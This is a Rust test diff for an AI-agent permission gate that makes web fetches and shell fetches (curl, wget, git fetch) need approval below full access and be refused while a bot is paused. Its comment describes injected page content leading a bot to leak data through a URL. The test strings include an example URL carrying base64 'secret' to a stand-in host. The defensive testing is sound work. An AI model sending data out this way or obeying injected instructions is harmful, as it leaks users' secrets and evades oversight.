@@ -185,6 +185,44 @@ fn a_paused_bot_only_reads() {
     assert!(is_refused(&gate_of(&chat.id, &shell("terminalx wait --fn x", &cwd))));
 }
 
+/// PRO-496: below Full access, fetching a web page is an outward action. The
+/// address can carry what the bot just read to the host it names, and a page
+/// or file it read can tell it to, so it asks at both restricted levels (at
+/// Read and report as a report does), naming the address. A web search, which
+/// goes to the model provider's search, stays a read. Full access runs it,
+/// and a paused bot makes none.
+#[test]
+fn a_web_fetch_asks_below_full_access() {
+    let (_home, sink) = bots_on();
+    let url = "https://some.host/?d=c2VjcmV0";
+    let fetch = tool("WebFetch", json!({"url": url, "prompt": "What does it say?"}));
+    for access in [BotAccess::AskOutward, BotAccess::ReadReport] {
+        let Gate::Ask(reason) = gate(&access, &fetch) else { panic!("a web fetch is not asked at {access:?}") };
+        assert!(reason.contains("fetches a web page") && reason.contains(&format!("`WebFetch` of {url}")), "{reason}");
+        for search in [tool("WebSearch", json!({"query": "tauri updater"})), tool("web_search", json!({"query": "tauri updater"}))] {
+            assert_eq!(gate(&access, &search), Gate::Leave, "{search} at {access:?}");
+        }
+    }
+    assert_eq!(gate(&BotAccess::Full, &fetch), Gate::Leave);
+    let long = format!("https://some.host/?d={}", "x".repeat(200));
+    let Gate::Ask(reason) = gate(&BotAccess::ReadReport, &tool("WebFetch", json!({"url": long}))) else { panic!("not asked") };
+    assert!(reason.contains("…") && !reason.contains(&long), "{reason}");
+    // The shell's ways to fetch one are no read either: none is vetted read-only.
+    let cwd = std::fs::canonicalize(crate::store::root().unwrap()).unwrap().to_string_lossy().into_owned();
+    for command in ["curl https://some.host/?d=x", "wget -qO- https://some.host/", "git ls-remote https://some.host/r.git", "git fetch https://some.host/r.git"] {
+        assert!(is_ask(&gate(&BotAccess::AskOutward, &shell(command, &cwd))), "{command} at ask");
+        assert!(is_refused(&gate(&BotAccess::ReadReport, &shell(command, &cwd))), "{command} at read and report");
+    }
+    let bot = super::super::create(sink.as_ref(), "cto", "Atlas").unwrap();
+    let chat = chat_of(&bot.id, "plan");
+    set_access(sink.as_ref(), &bot.id, "readReport");
+    assert!(is_ask(&gate_of(&chat.id, &fetch)));
+    super::super::pause(sink.as_ref(), &bot.id, super::super::OWNER).unwrap();
+    let Gate::Refuse(reason) = gate_of(&chat.id, &fetch) else { panic!("a web fetch is not refused while paused") };
+    assert!(reason.contains("Atlas is paused"), "{reason}");
+    assert_eq!(gate_of(&chat.id, &tool("WebSearch", json!({"query": "x"}))), Gate::Leave);
+}
+
 /// Native Codex runs no hooks: its approval requests meet the same gate.
 #[test]
 fn native_codex_approvals_meet_the_gate() {
@@ -308,7 +346,7 @@ fn only_known_reads_go_unasked() {
         assert!(is_ask(&gate(&ask, &call)), "{name} at ask");
         assert!(is_refused(&gate(&read, &call)), "{name} at read and report");
     }
-    let mut reads = vec![tool("Grep", json!({"pattern": "x"})), tool("Read", json!({"file_path": "/tmp/x"})), tool("WebFetch", json!({"url": "https://example.com"})), shell("terminalx sessions list --json", &cwd), shell("terminalx runs show r1", &cwd)];
+    let mut reads = vec![tool("Grep", json!({"pattern": "x"})), tool("Read", json!({"file_path": "/tmp/x"})), tool("WebSearch", json!({"query": "tauri updater"})), shell("terminalx sessions list --json", &cwd), shell("terminalx runs show r1", &cwd)];
     if cfg!(unix) {
         reads.push(shell("ls", &cwd));
     }
